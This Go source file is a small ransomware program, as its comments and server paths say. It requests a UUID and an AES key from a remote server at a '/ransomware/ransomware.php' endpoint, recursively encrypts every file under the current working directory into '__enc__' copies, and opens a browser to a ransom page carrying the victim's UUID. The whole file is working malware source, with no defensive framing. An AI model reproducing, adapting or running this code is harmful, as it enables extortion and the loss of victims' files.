package main
import "crypto/aes"
import "crypto/cipher"
import "io/ioutil"
import "io"
import "crypto/rand"
import "os"
import "bytes"
import "fmt"
import "net/http"
import "encoding/json"
import "log"
import "os/exec"
import "runtime"

// The extension that the encrypted files will have
var encryption_extension string = "__enc__"
// The API's URL for getting the UUID and the encryption key
var base_url string = "http://eduardos-macbook-pro-15.local:8888"

// The response struct for holding the uuid and the 16 byte key that the API sends
type Response struct {
    Uuid string
    Key string
}

// This function receives the name of the directory to encrypt and its 16 byte encryption key 
func encryptDirectory(nameDir string, key []byte) {
    files, err := ioutil.ReadDir(nameDir)
    if err != nil {
        log.Fatal(err)
    }

    for _, f := range files {
        // This will be the absolute path to either the directory or the path
        var fullChildPath string = nameDir + "/" + f.Name()

        // We check the file type of this file/directory
        fileInfo, err := os.Stat(fullChildPath)
        if err != nil {
            panic(err.Error())
        }
        // If it's a directory, we transverse recursively
        if fileInfo.IsDir() {
            // We parallelize the encryption from the child directory 
            encryptDirectory(fullChildPath, key)
        } else {
            // We parallelize the encryption from the file
            encryptFile(fullChildPath, key)
        }
    }
}

// Function for encrypting a file based on its name and a 16 byte encryption key
func encryptFile(name string, key []byte) {
    plaintext, err := ioutil.ReadFile(name)
    if err != nil {
        panic(err.Error())
    }

    // this is a key
    
    block, err := aes.NewCipher(key)
    if err != nil {
        panic(err)
    }

    // The variable where the ciphertext is going to be put in
    ciphertext := make([]byte, aes.BlockSize + len(plaintext))

    // Make IV the size of the AES Block Size
    iv := ciphertext[:aes.BlockSize]

    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        panic(err)
    }

    stream := cipher.NewCFBEncrypter(block, iv)

    stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
    // Create file with encrypted content
    createFileWithContents(name + encryption_extension, ciphertext)
}

// Function for creating a file based on the text that is received
func createFileWithContents(file  string, text []byte){
    // We create a new file for saving the encrypted data.
    f, err := os.Create(file)
    if err != nil {
        panic(err.Error())
    }
    _, err = io.Copy(f, bytes.NewReader(text))
    if err != nil {
        panic(err.Error())
    }
}

// Function for getting the uuid and the encryption key
func makeRemoteCall() (string, string) {
    url := base_url + "/ransomware/ransomware.php"
    req, err := http.NewRequest("GET", url, nil)
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    var key Response
    json.Unmarshal(body, &key)
    // Return the uuid and the key
    return key.Uuid, key.Key
}

// Function for opening a browser with the url
func openBrowser(url string) bool {
    var args []string
    switch runtime.GOOS {
    case "darwin":
        args = []string{"open"}
    case "windows":
        args = []string{"C:/Program Files (x86)/Google/Chrome/Application/chrome.exe ", "--chrome-frame --kiosk "}
    default:
        args = []string{"xdg-open"}
    }
    cmd := exec.Command(args[0], append(args[1:], url)...)
    return cmd.Start() == nil
}

func main() {
    // Get the current directory
    dir, _ := os.Getwd()
    // Make the remote call to the server to get the uuid and the key to encrypt
    uuid_16, key_16 := makeRemoteCall()
    fmt.Println("uuid:", uuid_16)
    key := []byte(key_16)
    // Encrypt directory and its files with the key
    encryptDirectory(dir,key)
    // Open browser with the UUID at the end of the url.    
    openBrowser(base_url + "/ransomware/index.html?uuid=" + uuid_16)
}